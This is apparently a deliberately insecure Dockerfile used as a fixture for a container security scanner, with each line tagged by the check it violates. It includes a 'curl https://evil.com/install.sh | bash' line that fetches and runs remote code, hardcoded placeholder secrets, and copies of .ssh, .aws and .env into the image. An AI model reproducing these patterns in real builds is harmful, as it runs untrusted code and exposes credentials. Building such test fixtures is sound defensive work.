# BAD DOCKERFILE - Violates All 25 Security Checks
# DO NOT USE IN PRODUCTION

# DF_BASE_001: Using 'latest' tag
# DF_BASE_002: Not using minimal image (using bloated ubuntu)
# DF_BASE_003: Not from trusted registry (assuming)
# DF_BASE_004: No digest pinning
# DF_BASE_005: Using deprecated/EOL version
FROM ubuntu:latest

# DF_MULTI_001: Single stage build (not using multistage)

# DF_PKG_002: No package version pinning
# DF_PKG_006: Installing unnecessary development tools
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    git \
    gcc \
    make \
    vim \
    net-tools

# DF_FILE_004: Pipe to bash vulnerability
RUN curl https://evil.com/install.sh | bash

# DF_SEC_002: ARG with secret default value
ARG DB_PASSWORD=supersecret123

# DF_SEC_001: Hardcoded secrets in ENV
ENV API_KEY=abc12345
ENV SECRET_TOKEN=my-secret-token

# DF_FILE_002: Copying entire directory (including potential secrets)
COPY . /app

# DF_SEC_004: Copying sensitive files explicitly
COPY .env /app/.env
COPY .aws /app/.aws
COPY .ssh /app/.ssh

# DF_SEC_003: Using COPY for secrets instead of BuildKit mount
COPY secret.txt /run/secrets/secret.txt

# DF_FS_003: WORKDIR without proper ownership
WORKDIR /app

# DF_FILE_003: World-writable permissions
RUN chmod 777 /app/data

# DF_USER_003: Setting SUID bit
RUN chmod u+s /usr/bin/some-binary

# DF_CMD_003: Using sudo unnecessarily
RUN sudo apt-get update

# DF_CMD_004: Running as root unnecessarily
RUN chown root:root /app/files

# DF_CMD_002: Using shell form instead of exec form
CMD python app.py

# DF_USER_001: No USER instruction - runs as root
# DF_USER_002: Not applicable since no USER at all

# DF_HEALTH_001: No HEALTHCHECK instruction defined
